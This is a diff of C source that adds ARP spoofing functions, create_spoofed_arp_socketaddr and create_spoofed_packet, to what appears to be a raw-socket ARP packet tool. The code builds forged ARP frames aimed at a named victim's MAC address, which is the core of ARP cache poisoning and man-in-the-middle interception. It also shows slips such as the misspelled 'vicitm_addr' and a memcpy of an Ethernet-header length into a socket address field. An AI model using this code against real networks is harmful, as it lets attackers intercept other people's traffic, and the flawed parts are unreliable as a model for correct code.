@@ -33,7 +33,7 @@ arp_hdr_t *create_arp_packet(params_t *params, int socket_fd)
     return arp_hdr;
 }
 
-struct sockaddr_ll *create_arp_socketaddr(params_t *params)
+struct sockaddr_ll *create_broadcast_arp_socketaddr(params_t *params)
 {
     struct sockaddr_ll *sock = malloc(sizeof(*sock));
     int index = if_nametoindex(params->interface);
@@ -49,6 +49,20 @@ struct sockaddr_ll *create_arp_socketaddr(params_t *params)
     return sock;
 }
 
+struct sockaddr_ll *create_spoofed_arp_socketaddr(params_t *params,
+    char *vicitm_addr)
+{
+    struct sockaddr_ll *sock = malloc(sizeof(*sock));
+    int index = if_nametoindex(params->interface);
+
+    sock->sll_family = AF_PACKET;
+    sock->sll_protocol = htons(ETH_P_ARP);
+    sock->sll_halen = MACADDR_LEN;
+    sock->sll_ifindex = index;
+    memcpy(sock->sll_addr, vicitm_addr, ETHHDR_LEN);
+    return sock;
+}
+
 char *create_sendable_packet(arp_hdr_t *arp_hdr,
     struct sockaddr_ll *arp_sockaddr, params_t *params)
 {
@@ -60,6 +74,31 @@ char *create_sendable_packet(arp_hdr_t *arp_hdr,
 
     memset(eth_header->h_dest, 0xff, MACADDR_LEN);
     memset(arp_header->target_mac, 0x00, MACADDR_LEN);
+    memcpy(eth_header->h_source, arp_hdr->source_mac, MACADDR_LEN);
+    memcpy(arp_header->source_mac, arp_hdr->source_mac, MACADDR_LEN);
+    memcpy(arp_sockaddr->sll_addr, arp_hdr->source_mac, MACADDR_LEN);
+    eth_header->h_proto = htons(ETH_P_ARP);
+    arp_header->hardware_type = arp_hdr->hardware_type;
+    arp_header->hardware_len = arp_hdr->hardware_len;
+    arp_header->protocol_type = arp_hdr->protocol_type;
+    arp_header->protocol_len = arp_hdr->protocol_len;
+    arp_header->opcode = arp_hdr->opcode;
+    memcpy(arp_header->source_ip, &source_ip, sizeof(uint32_t));
+    memcpy(arp_header->target_ip, &target_ip, sizeof(uint32_t));
+    return packet;
+}
+
+char *create_spoofed_packet(arp_hdr_t *arp_hdr,
+    struct sockaddr_ll *arp_sockaddr, params_t *params, char *victim_addr)
+{
+    char *packet = malloc(sizeof(char) * PACKET_LEN);
+    struct ethhdr *eth_header = (struct ethhdr *)packet;
+    arp_hdr_t *arp_header = (arp_hdr_t *)(packet + ETHHDR_LEN);
+    uint32_t target_ip = inet_addr(params->dest_ip);
+    uint32_t source_ip = inet_addr(params->source_ip);
+
+    memcpy(eth_header->h_dest, victim_addr, MACADDR_LEN);
+    memcpy(arp_header->target_mac, victim_addr, MACADDR_LEN);
     memcpy(eth_header->h_source, arp_hdr->source_mac, MACADDR_LEN);
     memcpy(arp_header->source_mac, arp_hdr->source_mac, MACADDR_LEN);
     memcpy(arp_sockaddr->sll_addr, arp_hdr->source_mac, MACADDR_LEN);
